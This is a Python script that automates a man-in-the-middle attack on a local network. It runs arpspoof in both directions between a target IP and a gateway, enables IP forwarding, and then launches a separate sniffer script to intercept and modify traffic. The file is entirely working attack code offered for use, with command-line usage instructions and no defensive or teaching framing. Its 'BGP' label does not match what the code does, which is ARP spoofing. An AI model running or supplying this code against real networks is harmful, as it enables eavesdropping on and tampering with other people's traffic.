#!/usr/bin/env python3
"""
full_attack.py - Full automation of BGP MITM attack chain
"""

import subprocess
import time
import sys
import os
import signal
from .utils import setup_logging, enable_ip_forwarding

logger = setup_logging("full_attack")
processes = []

def signal_handler(sig, frame):
    logger.info("Stopping all processes...")
    for p in processes:
        p.terminate()
    logger.info("Cleanup complete")
    sys.exit(0)

def run_attack(target, gateway, interface="eth0"):
    logger.info("=" * 60)
    logger.info("BGP MITM - Full Attack Chain")
    logger.info(f"Target: {target}, Gateway: {gateway}, Interface: {interface}")
    logger.info("=" * 60)
    enable_ip_forwarding()
    logger.info("Starting ARP spoofing...")
    p1 = subprocess.Popen(["sudo", "arpspoof", "-i", interface, "-t", target, gateway])
    p2 = subprocess.Popen(["sudo", "arpspoof", "-i", interface, "-t", gateway, target])
    processes.extend([p1, p2])
    time.sleep(2)
    logger.info("Starting packet sniffer and modifier...")
    logger.info("Press Ctrl+C to stop")
    script_dir = os.path.dirname(os.path.abspath(__file__))
    sniffer_path = os.path.join(script_dir, "packet_sniffer.py")
    try:
        subprocess.run(["sudo", "python3", sniffer_path])
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 full_attack.py <target_ip> <gateway_ip> [interface]")
        sys.exit(1)
    signal.signal(signal.SIGINT, signal_handler)
    interface = sys.argv[3] if len(sys.argv) > 3 else "eth0"
    run_attack(sys.argv[1], sys.argv[2], interface)